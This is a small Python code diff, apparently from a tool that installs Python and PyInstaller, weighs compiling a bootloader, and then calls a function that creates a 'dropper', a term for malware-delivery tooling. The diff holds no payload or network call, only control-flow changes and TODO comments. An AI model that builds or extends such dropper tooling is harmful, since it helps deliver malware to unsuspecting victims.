@@ -40,10 +40,11 @@ def main():
         install_python()
 
     pythonPath = find_python_path()
-    if not is_admin():
-        get_pyinstaller(pythonPath,admin=False)
-    else:
-        get_pyinstaller(pythonPath)
+    if get_pyinstaller(pythonPath):
+        #WE INSTALLED PYINSTALLER, POSSIBLY COMPILING
+        #//TODO 35: FIND A WAY TO CHECK IF WE COMPILED THE BOOTLOADER
+        #what next?
+        pass
     create_dropper() #in the end, when we installed everything --> we create dropper
     return
 
